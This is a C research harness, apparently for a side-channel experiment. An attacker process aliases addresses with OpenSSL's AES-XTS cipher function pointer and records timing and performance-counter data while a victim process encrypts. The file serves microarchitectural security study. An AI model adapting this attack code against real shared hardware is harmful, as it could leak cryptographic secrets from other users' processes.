#define _GNU_SOURCE
#include <inttypes.h>
#include <sched.h>
#include <stdlib.h>
#include <openssl/evp.h>
#include <include/internal/evp_int.h>
#include <evp/evp_locl.h>

#include "macros.h"
#include "pmc.h"
#include "synch.h"
#include "util.h"
#include "x86intrin.h"

#define NEXPTS 2
#define NSAMPLES 100000
#define PMC_PROC 'v'

counter programmables[] =
{
  { 0x01410114ull, "ARITH.DIVIDER_ACTIVE"},
  { 0x418489ull, "BR_MISP_EXEC.TAKEN_INDIRECT_JUMP_NON_CALL_RET" },
};
uint64_t key_int[2] = {0xdeadb17e01234567, 0xfeedcaba98989898};




int attack_sample(void *ctx, void *ct, int *len, void *pt) {
  int ret;

  JMPNEXT64
  /* For the victim, ret = normal
    * For the attack, ret =  timing*/
  ret = EVP_EncryptUpdate(ctx, ct, len, pt, 16); 

  return ret;
}

uint8_t pages[16][4096];
void setup_state(void *s, void *ctx, void *ct, int *len, void *pt) {
#ifdef ATTACKER
  struct evp_cipher_ctx_st *tmp_ptr1 = ctx;
  struct evp_cipher_st     *tmp_ptr2 = (struct evp_cipher_st *)tmp_ptr1->cipher;
  void *victim_ptr = &tmp_ptr2->do_cipher;

  /* From experiments, last 12 bits seem to specify set and offset */
  uint64_t sequence[] = {0,  1,  3,  6, 13, 10,  4,  9,  2,  5, 11,  7, 15, 14, 12,  8};
  uintptr_t victim_ptr_mod12 = (uintptr_t)victim_ptr & 0xfff;

  synch_sync(s); 
  for(int i = 0; i < 10; i++)
    for(int j = 0; j < 16; j++) {
      uint8_t *ptr = &pages[sequence[j]][0];
      ptr = (uint8_t *)(victim_ptr_mod12 + (uintptr_t) ptr);
      *ptr = (uint8_t)(i * 31 + 17);
    }
  attack_sample(ctx, ct, len, pt);
#else
  synch_sync(s); 
  asm volatile(".rept 0x15f; nop; .endr;");
#endif
}

void pin(unsigned core) { 
  cpu_set_t cpuset;

  CPU_ZERO(&cpuset);
  CPU_SET(core, &cpuset);

  VERIFY(sched_setaffinity(0, sizeof(cpuset), &cpuset) == 0,
         "Unable to pin thread");
}

int main(int argc, char ** argv) {
  synch s;
  int len;
  unsigned core, i, j;
  size_t n_programmables = sizeof(programmables) / sizeof(programmables[0]);
  unsigned attacker_times[NEXPTS][NSAMPLES];
  uint64_t ctrs[NEXPTS][NSAMPLES][n_programmables];
  char pt[17], ct[17], proc;
  EVP_CIPHER_CTX *ctx;

  VERIFY(argc >= 3, "Not enough args");
  VERIFY(argv[1][0] == 'a' || argv[1][0] == 'v', 
         "Invalid process type");

  /*****************************************************************************/
  /*************************   Setup *******************************************/
  /* Args to local vars */
  proc = argv[1][0];
  sscanf(argv[2], "%u", &core);
  printf("Started  %c\n", proc);
  printf("%p %p\n", EVP_CipherUpdate, main);

  pin(core);
  srand((unsigned)__rdtsc());

#if USE_PMC
  if(proc == PMC_PROC)
    setup_pmc(core, programmables, n_programmables);
#endif
  /* Connect to shared memory for synchronization */
  synch_connect(&s);

  ctx = EVP_CIPHER_CTX_new();
  VERIFY(ctx != NULL, "EVP context creation failed");
  VERIFY(EVP_EncryptInit(ctx, EVP_aes_128_xts(), (const unsigned char *)&key_int[0], pt), 
        "EVP_EncryptInit failed");


  /*****************************************************************************/
  /*************************   Run expt  ***************************************/
  uint64_t expt_time = __rdtsc();
  for(i = 0; i < NEXPTS; i++)
  {
    /* Attacker gets NSAMPLES with the same victim secret */
    for(j = 0; j < NSAMPLES; j++) {

      if(proc == PMC_PROC){
        zero_pmc(n_programmables);
        start_pmc();
      }

      *(unsigned *)pt = 0xacacf0ac + (0x400 * i);
      asm(NOP4096);

      synch_sync(&s); 
      attacker_times[i][j] = attack_sample(ctx, ct, &len, pt);

      if(proc == PMC_PROC){
        stop_pmc();
        get_stats(ctrs[i][j], n_programmables);
      } 
      setup_state(&s, ctx, ct, &len, pt);
    }  
  }
  expt_time = __rdtsc() - expt_time;
  

  /*****************************************************************************/
  /*************************  Out stuff  ***************************************/
  if(proc == 'v')
    printf("TIME: %"PRIu64" cycles, %"PRIu64" msecs\n", expt_time, expt_time/4000000u);

  VERIFY(EVP_EncryptFinal_ex(ctx, ct, &len), "EVP_EncryptFinal_ex failed");
  VERIFY(len == 0, "Error__");

  synch_sync(&s);
  EVP_CIPHER_CTX_free(ctx);
  printf("Done %c\n", proc);

  FILE *fp_attacker_times;
  /* Output stats */
  if(proc == PMC_PROC){
    for(i = 0; i < NEXPTS; i++){
      unsigned ct8 = 0, ct16 = 0;
      for(j = 0; j < NSAMPLES; j++) {
        //TODO: Fix output
        // for(k = 0; k < n_programmables; k++)
        printf("%d-%"PRIu64"-%"PRIu64"\n", j, ctrs[i][j][0], ctrs[i][j][1]);
        if(ctrs[i][j][0] == 7)
          ct8++;
        else if(ctrs[i][j][0] == 14)
          ct16++;
      }
      printf("7-> %u, 14-> %u, Ratio: %f\n", ct8, ct16, ((float)ct8)/ct16);
    }
  } 
  if(proc == 'a') {
    fp_attacker_times = fopen("attack_smother_time.csv", "w+");
    for(i = 0; i < NEXPTS; i++){
      for(j = 0; j < NSAMPLES; j++)
        fprintf(fp_attacker_times, "%d, ", attacker_times[i][j]);
      fprintf(fp_attacker_times, "\n");
    }
    fclose(fp_attacker_times);
  }
}